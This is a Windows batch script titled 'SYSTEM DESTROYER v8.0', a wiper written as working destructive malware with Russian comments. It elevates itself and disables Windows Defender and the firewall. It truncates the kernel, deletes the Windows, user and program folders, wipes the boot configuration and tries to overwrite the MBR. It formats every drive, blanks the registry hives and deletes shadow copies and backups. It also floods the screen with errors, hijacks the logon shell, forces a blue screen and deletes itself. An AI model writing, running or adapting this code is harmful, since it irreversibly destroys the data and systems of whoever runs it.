@echo off
setlocal enabledelayedexpansion

:: ========== АВТОПОДЪЁМ ПРАВ ==========
net file 1>nul 2>nul || (
    powershell -Command "Start-Process '%~f0' -Verb RunAs" && exit
)

mode con: cols=80 lines=30
title SYSTEM DESTROYER v8.0 - APOCALYPSE NOW

:: ========== ФАЗА 0: ТОТАЛЬНОЕ ОТКЛЮЧЕНИЕ ЗАЩИТЫ ==========
echo [0] KILLING ALL SECURITY...
for %%s in (WinDefend, wscsvc, Sense, WdBoot, WdFilter, MsMpSvc, NisSrv) do (
    sc config %%s start= disabled >nul 2>&1
    sc stop %%s >nul 2>&1
)

netsh advfirewall set allprofiles state off >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

:: ========== ФАЗА 1: ПРЯМОЕ УДАЛЕНИЕ СИСТЕМНЫХ ПАПОК ==========
echo [1] DIRECT SYSTEM FOLDER DESTRUCTION...

:: Удаление через прямой доступ к диску
start "DIRECTKILL" /MIN /B powershell -Command "$f=[System.IO.File]::OpenWrite('C:\Windows\System32\ntoskrnl.exe');$f.SetLength(0);$f.Close()"

:: Физическое удаление папок через низкоуровневые команды
for %%f in (
    "C:\Windows"
    "C:\Program Files"
    "C:\Program Files (x86)"
    "C:\Users"
    "C:\ProgramData"
    "C:\Recovery"
) do (
    if exist %%f (
        echo FORCE DELETING %%f
        rd /s /q "%%f" 2>nul
        
        :: Если не удалось - берем владение и удаляем
        takeown /f "%%f" /r /d y >nul 2>&1
        icacls "%%f" /grant everyone:F /t /c /q >nul 2>&1
        icacls "%%f" /grant SYSTEM:F /t /c /q >nul 2>&1
        icacls "%%f" /grant Administrators:F /t /c /q >nul 2>&1
        
        :: Удаляем все файлы внутри
        del /f /s /q "%%f\*" >nul 2>&1
        rd /s /q "%%f" >nul 2>&1
    )
)

:: ========== ФАЗА 2: ФИЗИЧЕСКОЕ УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА ==========
echo [2] PHYSICAL BOOT DESTRUCTION...

:: Уничтожаем BCD конфигурацию
bcdedit /delete {default} /f >nul 2>&1
bcdedit /delete {bootmgr} /f >nul 2>&1
bcdedit /delete {current} /f >nul 2>&1

:: Уничтожаем загрузочные файлы
del /f /q C:\bootmgr C:\boot\bcd C:\boot\boot.sdi 2>nul
del /f /q C:\Windows\bootstat.dat C:\Windows\System32\winload.exe 2>nul

:: Пишем мусор в MBR
echo DEBUG METHOD:
echo f 200 l 1000 0
echo w 100 0
echo q
) > %temp%\debug.txt
debug < %temp%\debug.txt >nul 2>&1

:: ========== ФАЗА 3: ФОРМАТИРОВАНИЕ ВСЕХ ДИСКОВ ПАРАЛЛЕЛЬНО ==========
echo [3] PARALLEL DISK FORMATTING...

:: Форматируем все доступные диски
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo FORMATTING %%d:
        start "FORMAT_%%d" /MIN /B cmd /c "echo y|format %%d: /FS:NTFS /Q /X /V:DESTROYED"
    )
)

:: ========== ФАЗА 4: ПОВРЕЖДЕНИЕ РЕЕСТРА ==========
echo [4] REGISTRY DESTRUCTION...

:: Удаляем ключевые ветки реестра
for %%k in (
    "HKLM\SOFTWARE\Microsoft"
    "HKLM\SYSTEM\ControlSet001"
    "HKCU\Software\Microsoft"
    "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion"
) do (
    reg delete "%%k" /f >nul 2>&1
)

:: Портим файлы реестра напрямую
for %%f in (
    "C:\Windows\System32\config\SAM"
    "C:\Windows\System32\config\SYSTEM"
    "C:\Windows\System32\config\SOFTWARE"
) do (
    if exist %%f (
        copy /y nul "%%f" >nul 2>&1
    )
)

:: ========== ФАЗА 5: ПЕРЕГРУЗКА СИСТЕМЫ И ОШИБКИ ==========
echo [5] SYSTEM OVERLOAD AND ERRORS...

:: Создаем бесконечные потоки ошибок
start "ERROR1" /MIN /B powershell -Command "while($true){[System.Windows.Forms.MessageBox]::Show('SYSTEM DESTROYED', 'FATAL', 0, 16)}"
start "ERROR2" /MIN /B powershell -Command "while($true){Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0)}"
start "ERROR3" /MIN /B powershell -Command "while($true){[Console]::Beep(500,300); sleep 0.1}"

:: Блокируем клавиатуру
start "KEYLOCK" /MIN /B powershell -Command "while($true){[System.Windows.Forms.SendKeys]::SendWait('{F1}{F2}{F3}{F4}{F5}')}"

:: Убиваем explorer и запрещаем запуск
taskkill /f /im explorer.exe >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c echo SYSTEM DESTROYED && pause" /f >nul 2>&1

:: ========== ФАЗА 6: УДАЛЕНИЕ ВОССТАНОВЛЕНИЯ ==========
echo [6] RECOVERY DESTRUCTION...

vssadmin delete shadows /all /quiet >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1
for /f "tokens=2 delims==" %%d in ('wmic logicaldisk get caption /value') do (
    vssadmin delete shadows /for=%%d /quiet >nul 2>&1
)

:: Удаляем папки восстановления
rd /s /q "C:\System Volume Information" 2>nul
rd /s /q "C:\Recovery" 2>nul
rd /s /q "C:\Windows.old" 2>nul

:: ========== ФИНАЛЬНЫЙ ОТСЧЕТ ==========
echo.
echo ========================================
echo    FINAL COUNTDOWN TO DEATH
echo ========================================
echo.

for /l %%i in (10,-1,0) do (
    cls
    echo.
    echo    ╔═══════════════════════════════════════╗
    echo    ║   SYSTEM DESTRUCTION: FINAL PHASE    ║
    echo    ║   REBOOT IN: %%i SECONDS              ║
    echo    ╚═══════════════════════════════════════╝
    echo.
    echo    STATUS REPORT:
    echo    [✓] Bootloader DESTROYED
    echo    [✓] System files ERASED
    echo    [✓] Registry CORRUPTED
    echo    [✓] Disks FORMATTING
    echo    [✓] Recovery REMOVED
    echo.
    echo    SYSTEM UNRECOVERABLE
    echo.
    timeout /t 1 /nobreak >nul
)

:: ========== ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА ==========
echo.
echo ========================================
echo    EXECUTING FINAL SYSTEM DESTRUCTION
echo ========================================
echo.

:: 1. Стандартная перезагрузка
shutdown /r /f /t 0

:: 2. WMIC перезагрузка
wmic os call reboot >nul 2>&1

:: 3. Powershell перезагрузка
powershell -Command "Restart-Computer -Force"

:: 4. Синий экран
rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
rundll32.exe ntdll.dll,NtRaiseHardError 0xC000021A 0 0 0 6 >nul 2>&1

:: Самоликвидация
del "%~f0" >nul 2>&1
exit
